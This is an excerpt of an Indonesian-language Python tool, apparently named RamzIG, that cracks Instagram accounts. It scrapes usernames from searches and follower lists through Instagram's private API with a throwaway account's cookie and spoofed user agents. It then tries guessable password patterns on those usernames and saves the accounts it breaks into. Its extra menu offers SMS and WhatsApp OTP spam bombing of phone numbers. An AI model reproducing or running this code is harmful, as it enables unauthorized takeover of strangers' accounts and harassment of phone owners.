...
#Halo Perkenalkan Saya BrayennnXD Saya Adalah Perecode Andal

#Thanks To : BrayennnXD,DerrXr,Noex999x
#Version Tools : 1.1
...
def BrayennnXD():
    rr = random.randint
    rc = random.choice
    ugents1 = f"Mozilla/5.0 (Linux; Android {str(rr(9,14))}; vivo 1907 Build/SP1A.{str(rr(111111,210000))}.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram 247.0.0.17.113 Android (31/12; {str(rr(200,240))}dpi; {str(rr(1100,1200))}x{str(rr(1800,1900))}; vivo; vivo 1907; 1907; mt6768; ru_RU; 388829083)"
    ugents2 = f"Mozilla/5.0 (Linux; Android {str(rr(9,14))}; vivo 1917 Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram 246.1.0.16.113 Android (30/11; {str(rr(200,240))}dpi; {str(rr(1100,1200))}x{str(rr(1800,1900))}; vivo; vivo 1917; 1917; qcom; en_US; 387809238)"
    ugents3 = f"Mozilla/5.0 (Linux; Android {str(rr(9,14))}; vivo 1917 Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram 246.1.0.16.113 Android (30/11; {str(rr(200,240))}dpi; {str(rr(1100,1200))}x{str(rr(1800,1900))}; vivo; vivo 1917; 1917; qcom; en_US; 387809238)"
    UaMainn = random.choice([ugents1, ugents2, ugents3])
    return UaMainn
...
try:
   ...
   os.system("clear")
   prints(Panel(f"{P2}            Anda Tidak Terhubung Ke Internet, Silahkan Periksa Koneksi Internet Anda",width=100,padding=(0,2),style=f"{color_table}"));sleep(3);exit()
...
def banner():
	...
	prints(Panel(f"""
{M2} ⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀                                                                  
{M2}⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠉⢹⣿⣆  ___   _  _   ___   _____   _     ___   ___     _     __  __     
{M2}⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠉⠛⠻⢿⣿⣿⣷⣶⣾⣿⣿ |_ _| | \| | / __| |_   _| /_\   / __| | _ \   /_\   |  \/  |    
{M2}⣿⣿⣿⣿⣿⡿⠋⠀⠀⣀⣠⣄⣀⠀⠀⠙⢿⣿⣿⣿⣿⣿  | |  | .` | \__ \   | |  / _ \ | (_ | |   /  / _ \  | |\/| |    
{M2}⣿⣿⣿⣿⣿⠁⠀⢠⣾⣿⣿⣿⣿⣷⡄⠀⠈⣿⣿⣿⣿⣿ |___| |_|\_| |___/   |_| /_/ \_\ \___| |_|_\ /_/ \_\ |_|  |_|    
{P2}⣿⣿⣿⣿⡇⠀⠀⢾⣿⣿⣿⣿⣿⣿⡷⠀⠀⢸⣿⣿⣿⣿         
{P2}⣿⣿⣿⣿⣿⡀⠀⠘⢿⣿⣿⣿⣿⡿⠃⠀⢀⣿⣿⣿⣿⣿         {P2}[+] Author Script BintangTzy
{P2}⣿⣿⣿⣿⣿⣷⣄⠀⠀⠉⠙⠋⠉⠀⠀⣠⣾⣿⣿⣿⣿⣿         {P2}[+] Recode By XyzonXD
{P2}⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿         {P2}[+] Nama Script RamzIG
{P2}⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏         {P2}[+] Version Script 2.3
{P2}⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀

""",title=f"{P2}{waktu()}",subtitle=f"",width=100,padding=(0,5),style=f"{color_table}"))
#------------------[ PYTHON VERSION ]-------------------#
try:
    # python 2
...
def cekAPI(cookie):
    ...
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":BrayennnXD(),"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        ...
        prints(Panel(f"{P2}Opshh Akun Tumbal Mu Terkena Checkpoint, Silahkan Login Dengan Akun Lain",width=100,style=f"{color_table}"));os.system('rm -rf data/.kukis.log rm -rf data/.username');exit()
...
def LoginCuyy():
    if "sukses" in lisensiku:
        try:
            ...
            banner()
            bray1 = f"{H2}01\n02\n03"
            bray2 = f"{P2}Login Menggunakan Cookie [ {H2}Recommended{P2} ]\nLogin Menggunakan Username & Password\nKeluar [{M2} Tools ]"
            bray3 = f"{H2}ON\n{M2} OFF\n{H2}ON"
            ifc = me()
            ifc.add_column(f"{P2}NO", style=TYA, justify='center')
            ifc.add_column(f"{P2}PILIHAN", style=TYA, justify='left',width=82)
            ifc.add_column(f"{P2}STATUS", style=TYA, justify='center')
            ifc.add_row(bray1,bray2,bray3)
            sol().print(ifc, justify='center',style=f"{color_table}")
            loginpil = input(f" [+] Pilih 1 Sampai 3 : ")
            if loginpil in [""]:prints(Panel(f"{P2}Harap Masukan Pilihan Yang Bener Jangan Sampai Salah!",width=100,padding=(0,12),style=f"{color_table}"));time.sleep(3);LoginCuyy()
            elif loginpil in ["1","01"]:loginCookie()
            elif loginpil in ["2","02"]:prints(Panel(f"{P2}Mohon Maaf Sementara Login Menggunakan Username & Password Di Nonaktifkan",width=100,padding=(0,1),style=f"{color_table}"));time.sleep(3);LoginCuyy()
            elif loginpil in ["3","03"]:exit()
            else:prints(Panel(f"{P2}Harap Masukan Pilihan Yang Bener Jangan sampai Salah!",width=100,padding=(0,12),style=f"{color_table}"));time.sleep(3);LoginCuyy()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
...
def loginCookie():
    if "sukses" in lisensiku:
        try:
            ...
            prints(Panel(f"{P2}     Sebelum Login Pastikan Akun Tumbal Bersifat Publik Dan Tidak Private",width=100,padding=(0,4),style=f"{color_table}"))
...
class instagramAPI:
	...
	def loginAPI(self):
		token=self.s.get("https://z-p42.www.instagram.com/",headers={"user-agent":BrayennnXD()}).text
...
class instagram:
	...
	def logo(self):
		for i in external:
			try:
				...
				pass
			banner()
			BrayGagah.append(Panel(f"{H2}- {P2}Nama      : {H2}{nama}\n{H2}- {P2}Username  : {H2}{self.username}",width=49,style=f"{color_table}"))
			BrayGagah.append(Panel(f"{H2}- {P2}Followers : {H2}{followers}\n{H2}- {P2}Following : {H2}{following}",width=50,style=f"{color_table}"))
			console.print(Columns(BrayGagah))
			prints(Panel(f"{H2}           {IP}",title=f"{P2}IP",subtitle=f"{P2}{CN}",width=100,padding=(0,31),style=f"{color_table}"))
			Bray1 = f"{H2}01\n02\n03\n04\n05\n06\n00"
			Bray2 = f"{P2}Crack Dari Pencarian Nama\nCrack Dari Pengikut\nCrack Dari Mengikuti\nCrack Ulang Hasil Cp\nLihat Akun Hasil Crack\nBot Auto Unfollow\nKeluar{P2}"
			Bray3 = f"{H2} ON\nON\nON\nON\nON\nON\nON"
			ifc = me()
			ifc.add_column(f"{P2}NO", style=TYA, justify='center')
			ifc.add_column(f"{P2}PILIHAN", style=TYA, justify='left',width=82)
			...
			ifc.add_row(Bray1,Bray2,Bray3)
			sol().print(ifc, justify='center',style=f"{color_table}")
			prints(Panel(f"             {P2} Jika Anda Ingin Melihat Fitur Tambahan Di Dalam Sc Ketik {H2}'Lainnya'{H2}",title=f"{P2}Informasi",style=f"{color_table}"))

	def Exit(self):
		x=input(f" [+] Apakah Anda Yakin Ingin Keluar? Y/t : ")
		if x in ["y","Y"]:os.system("rm -rf data/.kukis.log rm -rf data/.username");prints(Panel(f"{P2}Succeed Menghapus {color_rich}'Cookie' {P2}Terima Kasih Telah Menggunakan Script BrayenInsta",width=100,padding=(0,2),style=f"{color_table}"));time.sleep(2);exit()
	...
	def unfollowAPI(self,user_id,username_id,cookie):
		...
		xx=self.s.get("https://z-p42.www.instagram.com/",headers={"user-agent":BrayennnXD()}).content
	...
	def searchAPI(self,cookie,nama):
		try:
			x=s.get('https://z-p42.www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":BrayennnXD()})
			x_jason=json.loads(x.text)
			...
			prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=100,style=f"{color_table}"));time.sleep(3);exit()
		return internal

	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get("https://z-p42.www.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":BrayennnXD(),"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=100,style=f"{color_table}"));time.sleep(3);exit()
			except Exception as e:
				prints(Panel(f'{P2}         Username Yang Anda Masukan Tidak Di Temukan Atau Akun Private',width=100,padding=(0,7),style=f"{color_table}"));exit()
			return idx
		else:lisensi()
	...
	def ingfo(self,cookie):
		try:
			link = s.get(f"https://z-p42.www.instagram.com/api/v1/accounts/edit/web_form_data/", headers={"user-agent":BrayennnXD()},cookies={"cookie":cookie}).json()["form_data"]
		...
		if 'sukses' in  lisensiku:
			try:
				...
				if 'pengikut' in menudump:
					...
					for z in range (9999):
						x=s.get('https://z-p42.www.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":BrayennnXD()})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
		...
		if 'sukses' in  lisensiku:
			try:
				...
				if 'mengikuti' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://z-p42.www.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":BrayennnXD()})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
...
#------------------[ PILIH METODE AND PASSWORD ]-------------------#
	def ifo(self):
		urut = []
		prints(Panel(f"                                        {P2} Pilih methode",style=f"{color_table}"))
		urut.append(Panel(f"{P2}[01] Methode API ",padding=(0,14),style=f"{color_table}"))
		urut.append(Panel(f"{P2}[02] Methode AJAX",padding=(0,15),style=f"{color_table}"))
		console.print(Columns(urut))
		
	def passwordAPI(self,xnx):
		prints(Panel(f"{P2}           Total Username Terkumpul : {color_rich}{len(internal)}",width=100,padding=(0,20),style=f"{color_table}"))
		self.ifo()
		...
		if u in ["1","01"]:
			...
			method.append('satu')
		prints(Panel(f"{P2}[1] Name,Name123,Name1234\n[2] Name,Name123,Name1234,Name12345\n[3] Name,Name123,Name1234,Name12345,Name123456\n[4] Name,Name12,Name123,Name1234,Name12345,Name123456\n[5] Password Manual",width=100,padding=(0,3),title='List Password',style=f"{color_table}"))
	...
	def generateAPI(self,user,o,zx=''):
		global prog,des
		xxkontol.append(Panel(f"""{H2}Hasil OK TerSimpan Di{P2}: {P2}result/{day}.txt""",width=49,style=f"{color_table}"))
		xxkontol.append(Panel(f"""{K2}Hasil CP TerSimpan Di{P2}: {P2}result/{day}.txt""",width=50,style=f"{color_table}"))
		console.print(Columns(xxkontol))
		prints(Panel(f"{P2}           Crack Di Mulai Tekan {color_rich}'Ctrl+Z'{P2} Di Keyboard Anda Jika Ingin Berhenti\n\n                  {P2}Hidupkan Mode Pesawat 5 Detik Jika Terdeteksi Spam IP",width=100,padding=(0,4),style=f"{color_table}"))
						...
						for w in password.split(" "):
							if len(w)<3:
								...
								if o=="1":
									...
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'12',w+'321',w+'234',w+'4321',w+'12345',w+'123456',w+'1234567','pangkalanbun','kalimantan',password.lower()]
									else:
...
#					shinkai.submit(self.crackAPI,username,sandi)
						...
						pass
		prints(Panel(f"           {P2}Crack {color_rich}{len(internal)} {P2}Username Selesai Hasil OK : {H2}{len(success)}{P2} Hasil CP : {K2}{len(checkpoint)}{P2} ",width=100,padding=(0,8),style=f"{color_table}"));time.sleep(4);exit()

	def APIinfo(self,user):
		try:
			x=s.get("https://z-p42.www.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":BrayennnXD(),"x-ig-app-id":'936619743392459'})
		...
		try:
			for pw in pas:
				...
				if 'userId' in str(brayennnxd):
					...
					#tree.add(f"{P2}Postingan : {K2}{postingan}").add(f"{K2}{BrayennnXD()}\n")
					#prints(tree)
...
#------------------[ METODE API V2 ]-------------------#
	...
	def menu(self):
		self.logo()
		c=input(f' [+] Pilih 1 Sampai 7 : ')
		if c=='':
			prints(Panel(f"{P2}Pilih Yang Bener Broo Jangan Kosong !",width=100,padding=(0,19),style=f"{color_table}"));time.sleep(3);exit()
		elif c in ('1','01'):
			prints(Panel(f"{P2}Maaf Fitur Ini Sedang Dalam Proses {M2}Perbaikan{P2} Silahkan Pilih Menu Lainnya",width=100,style=f"{color_table}"));sleep(2);exit()
			mas='                                   Masukan Jumlah Target'
			mas1=nel(mas,style=f'{color_table}')
			sol().print(mas1)
			m=int(input(f'\n{N} [+] Jumlah : {C}'));print('')
			...
			for i in os.listdir('result'):
				prints(Panel(f"{P2}Hasil Crack {i}",width=100,style=f"{color_table}"))
			c=input(f' [+] Masukan Nama File : ')
			g=open("result/%s"%(c)).read().splitlines()
			print(f' Total Results : {H}{len(g)}{C}')
			prints(Panel(f"{P2}Proses Mengecek Status Akun. Silahkan Tunggu Sampai Proses Cek Selesai",width=100,style=f"{color_table}"))
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			prints(Panel(f"{P2}Proses Cek Akun Selesai, Silahkan Jalankan Ulang Scriptnya python Brayennn-Prem.py",width=100,padding=(0,3),style=f"{color_table}"))

		elif c in ('5','05'):
			print('')
			for i in os.listdir('result'):
				prints(Panel(f"{P2}Hasil Crack : {color_rich}{i}",width=100,style=f"{color_table}"))
			c=input(f' [+] Masukan Nama File : ')
			g=open("result/%s"%(c)).read().splitlines()
			xx=c.split("-")
			xc=xx[0]
...
{M}[{M}+{C}] {M}Checkpoint{C}:
 ...
 {H}[+]{C}{H} Mengikuti : {H}{ful}{C}
		...
		elif c in ("Lainnya","LAINNYA","lainnya"):
			menu_bot()
		elif c in ('0','00'):
			self.Exit() 
...
#------------------[ DEFF BOT ]-------------------#
def menu_bot():
	prints(Panel(f"{P2}[{color_rich}01{P2}] Bot Spam SMS              [{color_rich}03{P2}] Ganti Warna Tools\n[{color_rich}02{P2}] Bot Spam WA               [{color_rich}04{P2}] Upgrade Premium",width=100,padding=(0,8),style=f"{color_table}"))
	bray = input(f' [+] Pilih : ')
	if bray in(''):
		prints(f" [+] {P2}Pilih Yang Bener Broo Jangan Kosong !");time.sleep(3);exit()
	if bray in('1','01'):
		spam_sms()
	elif bray in('2','02'):
		spam_wa()
...
class sxp_sms:
	...
	def main(self):
		...
		prints(Panel(f"{P2}Sukses Spam SMS Ke No : {K2}+62{nomor}",width=100,padding=(0,2),style=f"{color_table}"))
        
def spam_wa():
	global nomor
	prints(Panel(f'''{P2}Contoh : {H2}+6281234567xxx''',width=100,padding=(0,8),style=f"{color_table}"))
	nomor = input(f" [+] {N}Input No Hp :{N} +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f'{P2}Tunggu Sedang Spam WhatsApp...'):process_data1()
			sxp_wa()
...
class sxp_wa:
	...
	def main(self):
		...
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		prints(Panel(f"{P2}Sukses Spam WA Ke No : {K2}+62{nomor}",width=100,padding=(0,2),style=f"{color_table}"))
...
def tema():
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. Change Theme Colour Red    [{color_rich}06{P2}]. Change Theme Colour Pink
[{color_rich}02{P2}]. Change Theme Colour Green  [{color_rich}07{P2}]. Change Theme Colour L Blue
[{color_rich}03{P2}]. Change Theme Colour Yellow [{color_rich}08{P2}]. Change Theme Colour White
[{color_rich}04{P2}]. Change Theme Colour Blue   [{color_rich}09{P2}]. Change Theme Colour Orange
[{color_rich}05{P2}]. Change Theme Colour Violet [{color_rich}10{P2}]. Change Theme Colour Gray""",width=100,padding=(0,4),style=f"{color_table}"))
	...
	time.sleep(2)
	prints(Panel("[white]Berhasil Mengganti Tema, Silahkan Jalankan Ulang Scriptnya python Brayennn-Prem.py",style=f"{color_table}"));time.sleep(2);exit()
...
def mengi(self):
			...
			prints(Panel(f"{P2}             Pastikan Username Target Yang Di Pilih Bersifat Publik Dan Jangan Private",width=100,style=f"{color_table}"))
			for t in range(m):
				t +=1
